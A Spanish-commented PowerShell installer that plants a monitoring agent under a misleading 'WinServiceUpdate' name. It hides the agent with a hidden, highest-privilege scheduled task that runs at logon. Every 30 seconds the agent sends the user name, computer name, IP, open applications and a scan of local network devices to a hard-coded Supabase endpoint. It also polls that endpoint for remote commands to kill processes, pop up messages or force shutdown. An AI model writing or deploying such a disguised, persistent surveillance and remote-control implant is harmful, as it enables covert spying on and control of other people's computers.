# setup.ps1 - Instalador Táctico
$alias = Read-Host "Introduce el ALIAS para esta PC"
$dir = "$env:APPDATA\WinServiceUpdate"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }

$path = "$dir\monitor.ps1"
$key = "sb_publishable_Bhk6iFwEBWSpeFJCHfb_Sg__UDavlUj"
$url_logs = "https://empkipdihlmmumwvzkyd.supabase.co/rest/v1/log_monitoreo"
$url_cmds = "https://empkipdihlmmumwvzkyd.supabase.co/rest/v1/comandos_remotos"

$content = @"
`$alias = '$alias'
`$url = '$url_logs'
`$url_cmds = '$url_cmds'
`$apiKey = '$key'
`$headers = @{ 'apikey' = `$apiKey; 'Authorization' = "Bearer `$apiKey"; 'Content-Type' = 'application/json' }
while(`$true) {
    `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    `$ipData = ipconfig | Select-String "IPv4" | Select-String "192.168."
    `$ip = if (`$ipData) { (`$ipData.ToString().Split(':')[-1]).Trim() } else { "127.0.0.1" }
    `$redBase = `$ip.Substring(0, `$ip.LastIndexOf('.'))
    1..5 | ForEach-Object { Test-Connection -ComputerName "`$redBase.`$_" -Count 1 -Quiet -ErrorAction SilentlyContinue }
    `$dispositivos = arp -a | Select-String "`$redBase\." | ForEach-Object {
        if (`$_ -match 'din') {
            `$cols = `$_.ToString().Trim() -split '\s+'
            if (`$cols.Count -ge 2) { `$cols[0] + ' [' + `$cols[1] + ']' }
        }
    }
    `$redString = `$dispositivos -join ' | '
    `$apps = (Get-Process | Where-Object { `$_.MainWindowTitle } | Select-Object -ExpandProperty ProcessName -Unique) -join ', '
    `$payloadLog = @{ nombre_equipo = `$env:COMPUTERNAME; alias_pc = `$alias; usuario_pc = `$env:USERNAME; ip_local = `$ip; datos_actividad = @{ apps = `$apps; red = `$redString; hora = `$timestamp } } | ConvertTo-Json -Compress
    try { Invoke-RestMethod -Uri `$url -Method Post -Headers `$headers -Body `$payloadLog -ContentType "application/json" } catch { }
    try {
        `$check = Invoke-RestMethod -Uri "`$(`$url_cmds)?alias_pc=eq.`$alias&ejecutado=eq.false" -Method Get -Headers `$headers
        if (`$check) {
            foreach (`$cmd in `$check) {
                switch (`$cmd.accion) {
                    'CERRAR_APPS' { Get-Process | Where-Object { `$_.MainWindowTitle -and `$_.ProcessName -ne 'explorer' } | Stop-Process -Force }
                    'CERRAR_PROCESO' { Stop-Process -Name `$cmd.payload -Force -ErrorAction SilentlyContinue }
                    'MENSAJE' { msg * /TIME:30 "`$(`$cmd.payload)" }
                    'APAGAR' { shutdown /s /t 30 /f /c "Apagado remoto" }
                }
                `$idC = `$cmd.id
                Invoke-RestMethod -Uri "`$(`$url_cmds)?id=eq.`$idC" -Method Patch -Headers `$headers -Body (@{ejecutado=`$true} | ConvertTo-Json)
            }
        }
    } catch { }
    Start-Sleep -Seconds 30
}
"@

Set-Content -Path $path -Value $content
Stop-Process -Name powershell -Force -ErrorAction SilentlyContinue
schtasks /delete /tn "WinServiceUpdate" /f 2>$null
schtasks /create /tn "WinServiceUpdate" /tr "powershell.exe -WindowStyle Hidden -File '$path'" /sc onlogon /rl highest /f
schtasks /run /tn "WinServiceUpdate"
Write-Host "INSTALACION COMPLETADA" -ForegroundColor Green
echo INSTALACION V10 COMPLETADA.
pause
